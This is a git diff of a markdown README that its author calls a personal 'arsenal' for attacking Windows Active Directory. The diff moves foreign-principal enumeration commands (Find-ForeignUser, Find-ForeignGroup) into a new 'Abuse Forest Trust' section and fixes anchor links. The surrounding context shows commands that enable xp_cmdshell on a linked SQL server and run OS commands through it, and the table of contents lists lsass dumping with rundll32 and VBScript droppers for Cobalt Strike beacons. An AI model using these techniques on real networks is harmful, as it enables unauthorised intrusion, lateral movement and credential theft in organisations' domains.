@@ -14,7 +14,6 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* **[Constrained Language Mode](#constrained-language-mode)**
 		* [CLM Enumeration](#clm-enumeration)
 		* [Dump lsass with rundll32](#dump-lsass-process-with-signed-binary)
-	* **[Foreign Principals](#foreign-principals)**
 * **Delegation**
 	* [Unconstrained Delegation](#unconstrained-delegation)
 		* [Printer Bug](#printer-bug)
@@ -32,9 +31,9 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [Get SQL Linked Server](#get-sql-linked-server)
 	* [Execute SQL Query and OS Command](#execute-sql-query-and-os-command)
 * **[Abuse Forest Trust](#abuse-forest-trust)**
-	* [SID History](#)
-	* [Shadow Principal](#)
-	* [Foreign Principal](#)
+	* [SID History](#sid-history)
+	* [Shadow Principal](#shadow-principal)
+	* [Foreign Principal](#foreign-principal)
 * **[Generate VBScript dropper (APC process injection)](#generate-vbscript-dropper-apc-process-injection)**
 	* [Cobalt Strike Beacon](#cobalt-strike-beacon)
 	* [Covenant Grunt](#convenant-grunt)
@@ -79,16 +78,6 @@ Get-DomainComputer -TrustedToAuth -Properties name,msds-allowedtodelegateto
 Get-DomainUser -TrustedToAuth -Properties name,msds-allowedtodelegateto
 ```
 You can abuse these delegation permission by referring [here](#unconstrained-delegation)
-
-### Foreign Principals
-Foreign principal means other user(s) from trusted domain that have access to current domain
-```
-# Get foreign user principals
-Find-ForeignUser
-
-# Get foreign group principals
-Find-ForeignGroup
-```
 
 ## Constrained Language Mode (CLM) / WDAC / Device Guard
 ### CLM Enumeration
@@ -214,6 +203,22 @@ Get-SQLQuery -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;''
 # Execute OS command
 Get-SQLQuery -Query 'EXECUTE(''xp_cmdshell ''''whoami'''''') AT "DB-SQLSRV"'
 Invoke-SQLOSCmd -Instance DB-SQLSRV -Command "whoami"
+```
+## Abuse Forest Trust
+### SID History
+//add here
+
+### Shadow Principal
+//add here
+
+### Foreign Principal
+Foreign principal means other user(s) from trusted domain that have access to current domain
+```
+# Get foreign user principals
+Find-ForeignUser
+
+# Get foreign group principals
+Find-ForeignGroup
 ```
 
 ## Generate VBScript dropper (APC process injection)
